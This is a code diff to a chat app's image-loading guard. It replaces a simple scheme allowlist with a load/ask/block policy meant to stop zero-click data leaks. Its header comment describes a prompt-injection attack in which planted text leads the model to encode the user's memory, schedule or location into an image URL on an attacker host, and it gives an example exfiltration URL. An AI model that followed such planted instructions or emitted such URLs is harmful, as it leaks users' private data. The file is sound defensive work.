@@ -1,33 +1,60 @@
 /**
- * Guard for markdown `![alt](url)` image sources rendered in chat.
+ * Which image sources in a chat message the phone may load without a tap.
  *
- * React Native `<Image>` will fetch any URI it's given, including `http:` and
- * scheme-prefixed vectors. Model-emitted markdown can include arbitrary image
- * URLs, so without a scheme check a tracking pixel (or a large asset) loads
- * automatically when the message renders. We allow only schemes that can't be
- * used for insecure-protocol egress or local-file access:
- *  - `https:` — legitimate external images (Wikipedia, diagrams, the API/R2
- *    origin for attachments).
- *  - `data:` / `blob:` — inline images the renderer itself produces.
+ * A reply can carry text an attacker planted (a web result, an uploaded PDF,
+ * a photo's OCR) telling the model to put the user's memory, schedule or
+ * location into an image URL: `![](https://attacker/p.png?d=…)`. The query,
+ * path or host carries the data, so loading such an image is a zero-click
+ * leak, not just IP/UA exposure. Only these load by themselves:
+ *  - the Recall API's own origin, the one the app already talks to (every
+ *    picture the server adds is an attachment there: photo lookups, answer
+ *    photos, generated images, the user's uploads);
+ *  - inline raster `data:` images and local `blob:` URIs (no network).
  *
- * `http:`, `file:`, `content:`, `ws:`, etc. are blocked. This intentionally
- * does NOT restrict by domain: the model legitimately references images on
- * many hosts, and an allowlist would regress that. No auth token is attached
- * to the image fetch, so the residual risk is limited to IP/UA exposure over
- * https — acceptable for a chat renderer.
+ * Any other `https:` image is "ask": a placeholder names its host and loads
+ * only on tap. `http:`, `file:`, `content:`, SVG data, relative paths and
+ * every other scheme are blocked. The server also turns model-written images
+ * into links before saving a reply (`apps/api/app/modules/chat/untrusted_media.py`);
+ * this covers the reply while it streams and older saved rows.
  */
-const ALLOWED_IMAGE_SCHEMES = new Set(["https:", "data:", "blob:"]);
+import { getApiUrl } from "@/lib/config";
 
-export function isAllowedImageUri(src: string | undefined | null): src is string {
-  if (!src || typeof src !== "string") return false;
-  const trimmed = src.trim();
-  if (!trimmed) return false;
+export type ImageLoadPolicy = "load" | "ask" | "block";
+
+const INLINE_RASTER = /^data:image\/(?:png|jpe?g|gif|webp|avif|heic|bmp);/i;
+
+function apiOrigin(): string | null {
   try {
-    const { protocol } = new URL(trimmed);
-    return ALLOWED_IMAGE_SCHEMES.has(protocol);
+    return new URL(getApiUrl()).origin;
   } catch {
-    // Bare relative paths (no scheme) aren't valid remote image sources here;
-    // require an absolute URL with an allowed scheme.
-    return false;
+    return null;
   }
+}
+
+function parse(src: string | undefined | null): URL | null {
+  if (!src || typeof src !== "string") return null;
+  const trimmed = src.trim();
+  if (!trimmed) return null;
+  try {
+    // Bare relative paths throw here: they are not image sources in a message.
+    return new URL(trimmed);
+  } catch {
+    return null;
+  }
+}
+
+export function imageLoadPolicy(src: string | undefined | null): ImageLoadPolicy {
+  const url = parse(src);
+  if (!url) return "block";
+  if (url.protocol === "blob:") return "load";
+  if (url.protocol === "data:") return INLINE_RASTER.test(url.href) ? "load" : "block";
+  if (url.username || url.password) return "block";
+  // The API's own origin, whatever its scheme (a dev server is plain http).
+  if (url.origin === apiOrigin()) return "load";
+  return url.protocol === "https:" ? "ask" : "block";
+}
+
+/** The host a tap-to-load placeholder names (punycode, so look-alikes show as such). */
+export function imageHost(src: string | undefined | null): string {
+  return parse(src)?.hostname ?? "";
 }
